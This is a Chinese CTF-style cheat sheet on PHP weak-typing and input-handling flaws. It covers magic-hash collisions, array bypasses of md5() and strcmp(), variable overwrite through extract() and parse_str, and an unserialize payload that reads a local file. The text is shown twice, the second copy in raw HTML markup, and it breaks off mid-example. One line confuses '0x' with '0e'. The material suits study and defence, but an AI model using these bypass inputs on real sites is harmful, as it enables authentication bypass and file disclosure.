### 1.弱类型比较

**![](https://images2018.cnblogs.com/blog/462486/201807/462486-20180718114524867-487464059.jpg)**

&nbsp;

**2.MD5 compare漏洞**

PHP在处理哈希字符串时，如果利用&rdquo;!=&rdquo;或&rdquo;==&rdquo;来对哈希值进行比较，它把每一个以&rdquo;0x&rdquo;开头的哈希值都解释为科学计数法0的多少次方（为0），所以如果两个不同的密码经过哈希以后，其哈希值都是以&rdquo;0e&rdquo;开头的，那么php将会认为他们相同。&nbsp;

常见的payload有

&nbsp;

0x01 md5(str)

&nbsp; &nbsp; QNKCDZO

&nbsp; &nbsp; 240610708

&nbsp; &nbsp; s878926199a

&nbsp; &nbsp; s155964671a

&nbsp; &nbsp; s214587387a

&nbsp; &nbsp; s214587387a

0x02 sha1(str)

&nbsp; &nbsp; sha1('aaroZmOk')&nbsp;&nbsp;

&nbsp; &nbsp; sha1('aaK1STfY')

&nbsp; &nbsp; sha1('aaO8zKZF')

&nbsp; &nbsp; sha1('aa3OFF9m')

&nbsp;

同时MD5不能处理数组，若有以下判断则可用数组绕过

&nbsp;

if(@md5($_GET['a']) == @md5($_GET['b']))

{

&nbsp; &nbsp; echo "yes";

}

//http://127.0.0.1/1.php?a[]=1&amp;b[]=2

&nbsp;

现在更厉害了&hellip;自从王小云教授提出了MD5碰撞之后这个就成了大热门，现在网上流传一个诸多密码专家写的MD5碰撞程序，是根据一个文件，然后填充内容生成两个MD5值一样的文件（有一定失败率其实），然后生成的内容MD5就相同了&hellip;强网杯签到题，简直震惊&hellip;软件是fastcoll_v1.0.0.5，自行下载吧

&nbsp;

**3.ereg函数漏洞：00截断**

ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE

字符串对比解析&nbsp;

在这里如果 $_GET[&lsquo;password&rsquo;]为数组，则返回值为NULL&nbsp;

如果为123 || asd || 12as || 123%00&amp;&amp;&amp;**，则返回值为true&nbsp;

其余为false

&nbsp;

**4.$key是什么？**

别忘记程序可以把变量本身的key也当变量提取给函数处理。

&nbsp;

&lt;?php

&nbsp; &nbsp; print_r(@$_GET);&nbsp;

&nbsp; &nbsp; foreach ($_GET AS $key =&gt; $value)

&nbsp; &nbsp; {

&nbsp; &nbsp; &nbsp; &nbsp; print $key."\n";

&nbsp; &nbsp; }

?&gt;

**5.变量覆盖**

主要涉及到的函数为extract函数，看个例子

&nbsp;

&lt;?php&nbsp;&nbsp;

&nbsp; &nbsp; $auth = '0';&nbsp;&nbsp;

&nbsp; &nbsp; // 这里可以覆盖$auth的变量值

&nbsp; &nbsp; print_r($_GET);

&nbsp; &nbsp; echo "&lt;/br&gt;";

&nbsp; &nbsp; extract($_GET);&nbsp;

&nbsp; &nbsp; if($auth == 1){&nbsp;&nbsp;

&nbsp; &nbsp; &nbsp; &nbsp; echo "private!";&nbsp;&nbsp;

&nbsp; &nbsp; } else{&nbsp;&nbsp;

&nbsp; &nbsp; &nbsp; &nbsp; echo "public!";&nbsp;&nbsp;

&nbsp; &nbsp; }&nbsp;&nbsp;

?&gt;

extract可以接收数组，然后重新给变量赋值，过程页很简单。&nbsp;

这里写图片描述

同时！PHP的特性$可以用来赋值变量名也能导致变量覆盖！

&nbsp;

&lt;?php&nbsp;&nbsp;

&nbsp; &nbsp; $a='hi';

&nbsp; &nbsp; foreach($_GET as $key =&gt; $value) {

&nbsp; &nbsp; &nbsp; &nbsp; echo $key."&lt;/br&gt;".$value;

&nbsp; &nbsp; &nbsp; &nbsp; $$key = $value;

&nbsp; &nbsp; }

&nbsp; &nbsp; print "&lt;/br&gt;".$a;

?&gt;

&nbsp;

&nbsp;

构造http://127.0.0.1:8080/test.php?a=12 即可达到目的。

&nbsp;

**6.strcmp**

如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。&nbsp;

先将两个参数先转换成string类型。&nbsp;

当比较数组和字符串的时候，返回是0。&nbsp;

如果参数不是string类型，直接return

&nbsp;

&nbsp;

&lt;?php

&nbsp; &nbsp; $password=$_GET['password'];

&nbsp; &nbsp; if (strcmp('xd',$password)) {

&nbsp; &nbsp; &nbsp;echo 'NO!';

&nbsp; &nbsp; } else{

&nbsp; &nbsp; &nbsp; &nbsp; echo 'YES!';

&nbsp; &nbsp; }

?&gt;

&nbsp;

构造http://127.0.0.1:8080/test.php?password[]=

&nbsp;

**7.is_numeric**

无需多言：

&nbsp;

&lt;?php

echo is_numeric(233333);&nbsp; &nbsp; &nbsp; &nbsp;# 1

echo is_numeric('233333');&nbsp; &nbsp; # 1

echo is_numeric(0x233333);&nbsp; &nbsp; # 1

echo is_numeric('0x233333');&nbsp; &nbsp;# 1

echo is_numeric('233333abc');&nbsp; # 0

?&gt;

&nbsp;

**8.preg_match**

如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题

&nbsp;

&lt;?php

$ip = 'asd 1.1.1.1 abcd'; // 可以绕过

if(!preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/",$ip)) {

&nbsp; die('error');

} else {

&nbsp; &nbsp;echo('key...');

}

?&gt;

&nbsp;

**9.parse_str**

与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。&nbsp;

时变量覆盖的一种

&nbsp;

&lt;?php

&nbsp; &nbsp; $var='init';&nbsp;&nbsp;

&nbsp; &nbsp; print $var."&lt;/br&gt;";

&nbsp; &nbsp; parse_str($_SERVER['QUERY_STRING']);&nbsp;&nbsp;

&nbsp; &nbsp; echo $_SERVER['QUERY_STRING']."&lt;/br&gt;";

&nbsp; &nbsp; print $var;

?&gt;

&nbsp;

**10.字符串比较**

&lt;?php&nbsp;&nbsp;

&nbsp; &nbsp; echo 0 == 'a' ;// a 转换为数字为 0&nbsp; &nbsp; 重点注意

&nbsp; &nbsp; // 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc

&nbsp; &nbsp; // 十六进制与整数，被转换为同一进制比较

&nbsp; &nbsp; '0xccccccccc' == '54975581388' ;

&nbsp;

&nbsp; &nbsp; // 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0

&nbsp; &nbsp; 1 == '1';

&nbsp; &nbsp; 1 == '01';

&nbsp; &nbsp; 10 == '1e1';

&nbsp; &nbsp; '100' == '1e2' ;&nbsp; &nbsp;&nbsp;

&nbsp;

&nbsp; &nbsp; // 十六进制数与带空格十六进制数，被转换为十六进制整数

&nbsp; &nbsp; '0xABCdef'&nbsp; == '&nbsp; &nbsp; &nbsp;0xABCdef';

&nbsp; &nbsp; echo '0010e2' == '1e3';

&nbsp; &nbsp; // 0e 开头会被当成数字，又是等于 0*10^xxx=0

&nbsp; &nbsp; // 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过

&nbsp; &nbsp; '0e509367213418206700842008763514' == '0e481036490867661113260034900752';

&nbsp; &nbsp; '0e481036490867661113260034900752' == '0' ;

&nbsp;

&nbsp; &nbsp; var_dump(md5('240610708') == md5('QNKCDZO'));

&nbsp; &nbsp; var_dump(md5('aabg7XSs') == md5('aabC9RqS'));

&nbsp; &nbsp; var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));

&nbsp; &nbsp; var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));

?&gt;

&nbsp;

**11.unset**

unset(bar);用来销毁指定的变量，如果变量bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过。

&nbsp;

&lt;?php&nbsp;&nbsp;

$_CONFIG['extraSecure'] = true;

&nbsp;

foreach(array('_GET','_POST') as $method) {

&nbsp; &nbsp; foreach($$method as $key=&gt;$value) {

&nbsp; &nbsp; &nbsp; // $key == _CONFIG

&nbsp; &nbsp; &nbsp; // $$key == $_CONFIG

&nbsp; &nbsp; &nbsp; // 这个函数会把 $_CONFIG 变量销毁

&nbsp; &nbsp; &nbsp; unset($$key);

&nbsp; &nbsp; }

}

&nbsp;

if ($_CONFIG['extraSecure'] == false) {

&nbsp; &nbsp; echo 'flag {****}';

}

?&gt;

&nbsp;

**12.intval()**

int转string：

&nbsp;

$var = 5;&nbsp;&nbsp;

方式1：$item = (string)$var;&nbsp;&nbsp;

方式2：$item = strval($var);&nbsp;

&nbsp;

string转int：intval()函数。

&nbsp;

var_dump(intval('2')) //2&nbsp;&nbsp;

var_dump(intval('3abcd')) //3&nbsp;&nbsp;

var_dump(intval('abcd')) //0&nbsp;

可以使用字符串-0转换，来自于wechall的方法

&nbsp;

说明intval()转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0&nbsp;

顺便说一下，intval可以被%00截断

&nbsp;

if($req['number']!=strval(intval($req['number']))){

&nbsp; &nbsp; &nbsp;$info = "number must be equal to it's integer!! ";&nbsp;&nbsp;

}

&nbsp;

如果当$req[&lsquo;number&rsquo;]=0%00即可绕过

&nbsp;

**13.switch()**

如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型，效果相当于intval函数。如下：

&nbsp;

&lt;?php

&nbsp; &nbsp; $i ="abc";&nbsp;&nbsp;

&nbsp; &nbsp; switch ($i) {&nbsp;&nbsp;

&nbsp; &nbsp; case 0:&nbsp;&nbsp;

&nbsp; &nbsp; case 1:&nbsp;&nbsp;

&nbsp; &nbsp; case 2:&nbsp;&nbsp;

&nbsp; &nbsp; echo "i is less than 3 but not negative";&nbsp;&nbsp;

&nbsp; &nbsp; break;&nbsp;&nbsp;

&nbsp; &nbsp; case 3:&nbsp;&nbsp;

&nbsp; &nbsp; echo "i is 3";&nbsp;&nbsp;

&nbsp; &nbsp; }&nbsp;

?&gt;

**14.in_array()**

$array=[0,1,2,'3'];&nbsp;&nbsp;

var_dump(in_array('abc', $array)); //true&nbsp;&nbsp;

var_dump(in_array('1bc', $array)); //true&nbsp;

&nbsp;

在所有php认为是int的地方输入string，都会被强制转换

&nbsp;

**15.serialize 和 unserialize漏洞**

这里我们先简单介绍一下php中的魔术方法（这里如果对于类、对象、方法不熟的先去学学吧），即Magic方法，php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号__开头的，比如 __construct， __destruct，__toString，__sleep，__wakeup等等。这些函数都会在某些特殊时候被自动调用。&nbsp;

例如__construct()方法会在一个对象被创建时自动调用，对应的__destruct则会在一个对象被销毁时调用等等。&nbsp;

这里有两个比较特别的Magic方法，__sleep 方法会在一个对象被序列化的时候调用。 __wakeup方法会在一个对象被反序列化的时候调用。

&nbsp;

&lt;?php

class test

{

&nbsp; &nbsp; public $username = '';

&nbsp; &nbsp; public $password = '';

&nbsp; &nbsp; public $file = '';

&nbsp; &nbsp; public function out(){

&nbsp; &nbsp; &nbsp; &nbsp; echo "username: ".$this-&gt;username."&lt;br&gt;"."password: ".$this-&gt;password ;

&nbsp; &nbsp; }

&nbsp; &nbsp; &nbsp;public function __toString() {

&nbsp; &nbsp; &nbsp; &nbsp; return file_get_contents($this-&gt;file);

&nbsp; &nbsp; }

}

$a = new test();

$a-&gt;file = 'C:\Users\YZ\Desktop\plan.txt';

echo serialize($a);

?&gt;

//tostring方法会在输出实例的时候执行，如果实例路径是隐秘文件就可以读取了

echo unserialize触发了__tostring函数，下面就可以读取了C:\Users\YZ\Desktop\plan.txt文件了

&nbsp;

&lt;?php

class test

{

&nbsp; &nbsp; public $username = '';

&nbsp; &nbsp; public $password = '';

&nbsp; &nbsp; public $file = '';

&nbsp; &nbsp; public function out(){

&nbsp; &nbsp; &nbsp; &nbsp; echo "username: ".$this-&gt;username."&lt;br&gt;"."password: ".$this-&gt;password ;

&nbsp; &nbsp; }

&nbsp; &nbsp; &nbsp;public function __toString() {

&nbsp; &nbsp; &nbsp; &nbsp; return file_get_contents($this-&gt;file);

&nbsp; &nbsp; }

}

$a = 'O:4:"test":3:{s:8:"username";s:0:"";s:8:"password";s:0:"";s:4:"file";s:28:"C:\Users\YZ\Desktop\plan.txt";}';

echo unserialize($a);

?&gt;

&nbsp;

**16.session 反序列化漏洞**

主要原因是&nbsp;

ini_set(&lsquo;session.serialize_handler&rsquo;, &lsquo;php_serialize&rsquo;);&nbsp;

ini_set(&lsquo;session.serialize_handler&rsquo;, &lsquo;php&rsquo;);&nbsp;

### <span style="box-sizing: border-box; outline: 0px; word-break: break-all;">1.弱类型比较</span>

&nbsp;

<center style="box-sizing: border-box; outline: 0px; word-break: break-all; color: #333333; font-family: -apple-system, 'SF UI Text', Arial, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif, SimHei, SimSun;">![这里写图片描述](https://img-blog.csdn.net/20170420111853960?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzUwNzg2MzE=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)</center>

&nbsp;

### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t1"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">2.MD5 compare漏洞</span>

PHP在处理哈希字符串时，如果利用&rdquo;!=&rdquo;或&rdquo;==&rdquo;来对哈希值进行比较，它把每一个以&rdquo;0x&rdquo;开头的哈希值都解释为科学计数法0的多少次方（为0），所以如果两个不同的密码经过哈希以后，其哈希值都是以&rdquo;0e&rdquo;开头的，那么php将会认为他们相同。&nbsp;
常见的payload有

    0x01 <span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;">md5(str)</span>
        QNKCDZO
        240610708
        s878926199a
        s155964671a
        s214587387a
        s214587387a
    0x02 <span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;">sha1(str)</span>
        <span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;">sha1(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'aaroZmOk'</span>)</span>  
        <span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;">sha1(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'aaK1STfY'</span>)</span>
        <span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;">sha1(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'aaO8zKZF'</span>)</span>
        <span class="hljs-function" style="box-sizing: border-box; outline: 0px; word-break: break-all;">sha1(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'aa3OFF9m'</span>)</span>
    `</pre>

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8
*   9
*   10
*   11
*   12
*   13

    同时MD5不能处理数组，若有以下判断则可用数组绕过

    <pre name="code" class="prettyprint">`<span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">if</span>(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">@md5</span>(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_GET</span>[<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'a'</span>]) == <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">@md5</span>(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_GET</span>[<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'b'</span>]))
    {
        echo <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"yes"</span>;
    }
    /<span class="hljs-regexp" style="box-sizing: border-box; outline: 0px; color: #008800; word-break: break-all;">/http:/</span><span class="hljs-regexp" style="box-sizing: border-box; outline: 0px; color: #008800; word-break: break-all;">/127.0.0.1/</span><span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">1</span>.php?a[]=<span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">1</span>&amp;b[]=<span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">2</span>`</pre>

*   1
*   2
*   3
*   4
*   5

    现在更厉害了&hellip;自从王小云教授提出了MD5碰撞之后这个就成了大热门，现在网上流传一个诸多密码专家写的MD5碰撞程序，是根据一个文件，然后填充内容生成两个MD5值一样的文件（有一定失败率其实），然后生成的内容MD5就相同了&hellip;强网杯签到题，简直震惊&hellip;软件是fastcoll_v1.0.0.5，自行下载吧

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t2"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">3.ereg函数漏洞：00截断</span>

    <pre name="code" class="prettyprint">`ereg (<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"^[a-zA-Z0-9]+$"</span>, <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_GET</span>[<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'password'</span>]) === <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">FALSE</span>`</pre>

*   1

    字符串对比解析&nbsp;
    在这里如果 $_GET[&lsquo;password&rsquo;]为数组，则返回值为NULL&nbsp;
    如果为123 || asd || 12as || 123%00&amp;&amp;&amp;**，则返回值为true&nbsp;
    其余为false

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t3"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">4.$key是什么？</span>

    别忘记程序可以把变量本身的key也当变量提取给函数处理。

    <pre name="code" class="prettyprint">`<span class="php" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">&lt;?php</span>
        print_r(@<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_GET</span>); 
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">foreach</span> (<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_GET</span> <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">AS</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$key</span> =&gt; <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$value</span>)
        {
            <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">print</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$key</span>.<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"\n"</span>;
        }
    <span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">?&gt;</span></span>`</pre>

*   1
*   2
*   3
*   4
*   5
*   6
*   7

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t4"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">5.变量覆盖</span>

    主要涉及到的函数为extract函数，看个例子

    <pre name="code" class="prettyprint">`<span class="php" style="box-sizing: border-box; outline: 0px; word-break: break-all;"><span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">&lt;?php</span>  
        <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$auth</span> = <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'0'</span>;  
        <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">// 这里可以覆盖$auth的变量值</span>
        print_r(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_GET</span>);
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"&lt;/br&gt;"</span>;
        extract(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_GET</span>); 
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">if</span>(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$auth</span> == <span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">1</span>){  
            <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"private!"</span>;  
        } <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">else</span>{  
            <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"public!"</span>;  
        }  
    <span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">?&gt;</span></span>`</pre>

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8
*   9
*   10
*   11
*   12

    extract可以接收数组，然后重新给变量赋值，过程页很简单。&nbsp;

    <center style="box-sizing: border-box; outline: 0px; word-break: break-all; color: #333333; font-family: -apple-system, 'SF UI Text', Arial, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif, SimHei, SimSun;">![这里写图片描述](https://img-blog.csdn.net/20170716160030765?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzUwNzg2MzE=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)</center>

    &nbsp;

    同时！PHP的特性<span style="box-sizing: border-box; outline: 0px; word-break: break-all;">$</span>可以用来赋值变量名也能导致变量覆盖！

    <pre name="code" class="prettyprint">`<span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">&lt;?php</span>  
        <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$a</span>=<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'hi'</span>;
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">foreach</span>(<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_GET</span> <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">as</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$key</span> =&gt; <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$value</span>) {
            <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$key</span>.<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"&lt;/br&gt;"</span>.<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$value</span>;
            <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$$key</span> = <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$value</span>;
        }
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">print</span> <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">"&lt;/br&gt;"</span>.<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$a</span>;
    <span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">?&gt;</span>`</pre>

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8

    构造`http://127.0.0.1:8080/test.php?a=12`&nbsp;即可达到目的。

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t5"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">6.strcmp</span>

    <pre class="prettyprint">`如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 
    先将两个参数先转换成string类型。 
    当比较数组和字符串的时候，返回是0。 
    如果参数不是string类型，直接return
    `</pre>

*   1
*   2
*   3
*   4
*   5
    <pre name="code" class="prettyprint">`<span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">&lt;?php</span>
        <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$password</span>=<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$_GET</span>[<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'password'</span>];
        <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">if</span> (strcmp(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'xd'</span>,<span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$password</span>)) {
         <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'NO!'</span>;
        } <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">else</span>{
            <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'YES!'</span>;
        }
    <span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">?&gt;</span>`</pre>

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8

    构造`http://127.0.0.1:8080/test.php?password[]=`

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t6"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">7.is_numeric</span>

    无需多言：

    <pre name="code" class="prettyprint">`<span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">&lt;?php</span>
    <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> is_numeric(<span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">233333</span>);       <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;"># 1</span>
    <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> is_numeric(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'233333'</span>);    <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;"># 1</span>
    <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> is_numeric(<span class="hljs-number" style="box-sizing: border-box; outline: 0px; color: #006666; word-break: break-all;">0x233333</span>);    <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;"># 1</span>
    <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> is_numeric(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'0x233333'</span>);   <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;"># 1</span>
    <span class="hljs-keyword" style="box-sizing: border-box; outline: 0px; color: #000088; word-break: break-all;">echo</span> is_numeric(<span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'233333abc'</span>);  <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;"># 0</span>
    <span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">?&gt;</span>`</pre>

*   1
*   2
*   3
*   4
*   5
*   6
*   7

    ### <a style="box-sizing: border-box; outline: 0px; color: #4ea1db; cursor: pointer; word-break: break-all;" name="t7"></a><span style="box-sizing: border-box; outline: 0px; word-break: break-all;">8.preg_match</span>

    <span style="box-sizing: border-box; outline: 0px; font-weight: bold; word-break: break-all;">如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题</span>

    <pre name="code" class="prettyprint">`<span class="hljs-preprocessor" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">&lt;?php</span>
    <span class="hljs-variable" style="box-sizing: border-box; outline: 0px; color: #4f4f4f; word-break: break-all;">$ip</span> = <span class="hljs-string" style="box-sizing: border-box; outline: 0px; color: #009900; word-break: break-all;">'asd 1.1.1.1 abcd'</span>; <span class="hljs-comment" style="box-sizing: border-box; outline: 0px; color: #880000; word-break: break-all;">// 可以绕过</span>
